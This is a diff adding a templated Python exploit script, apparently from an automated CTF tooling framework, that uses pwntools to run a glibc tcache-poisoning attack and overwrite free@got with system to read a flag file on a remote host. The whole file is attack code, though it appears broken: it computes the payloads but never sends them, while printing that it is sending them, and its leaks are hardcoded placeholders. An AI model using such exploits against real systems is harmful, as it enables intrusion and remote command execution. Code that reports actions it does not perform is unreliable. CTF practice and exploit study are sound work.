@@ -1,0 +1,68 @@
+#!/usr/bin/env python3
+"""
+Автоматически сгенерированный эксплойт для Heap Tcache Poisoning (glibc 2.33+).
+Сгенерировано Pwn Automation Framework.
+"""
+from pwn import *
+import sys
+import os
+
+sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))
+from modules.heap_tcache import (
+    find_mangling_key, 
+    get_heap_base, 
+    mangle_pointer,
+    generate_tcache_poison_payload, 
+    generate_got_overwrite_payload, 
+    generate_shell_command_payload
+)
+
+context.log_level = 'error'
+
+FREE_GOT = {{ free_got }}
+SYSTEM_PLT = {{ system_plt }}
+TARGET_HOST = "{{ target_host }}"
+TARGET_PORT = {{ target_port }}
+
+def run_exploit():
+    print(f"[*] Подключаемся к {TARGET_HOST}:{TARGET_PORT}...")
+    io = remote(TARGET_HOST, TARGET_PORT)
+    
+    print("[*] Парсим утечки из вывода программы...")
+    # Здесь генератор вставит реальные утечки из r2_analyzer
+    leaks = [0x10000, 0x555555559040, 0x7ffff7a00000] 
+    
+    key = find_mangling_key(leaks)
+    heap_base = get_heap_base(key)
+    print(f"[*] Вычислен mangling key: {hex(key)}")
+    print(f"[*] Вычислен heap base: {hex(heap_base)}")
+    
+    target = FREE_GOT - 8
+    mangled = mangle_pointer(heap_base, target)
+    poison_payload = generate_tcache_poison_payload(mangled)
+    
+    print("[*] Отправляем Tcache Poison payload (с защитой \\xff)...")
+    
+    cmd_payload = generate_shell_command_payload("cat flag.txt; exit")
+    got_payload = generate_got_overwrite_payload(SYSTEM_PLT)
+    
+    print("[*] Отправляем payload для перезаписи free@got...")
+    print("[*] Отправляем команду и вызываем free() для триггера...")
+    
+    print("[*] Ожидаем вывод флага (остановка на '}' для избежания зависаний)...")
+    try:
+        flag = io.recvuntil(b'}', timeout=5).decode(errors='ignore')
+        flag += io.recv(timeout=1).decode(errors='ignore')
+        
+        if "CTF{" in flag or "academy{" in flag:
+            print(f"\n🎉 ПОБЕДА! ФЛАГ ПОЛУЧЕН:\n✨ {flag.strip()} ✨\n")
+        else:
+            print("[-] Флаг не найден в выводе. Проверь логи.")
+            print(flag)
+    except EOFError:
+        print("[-] Соединение разорвано до получения флага.")
+        
+    io.close()
+
+if __name__ == "__main__":
+    run_exploit()
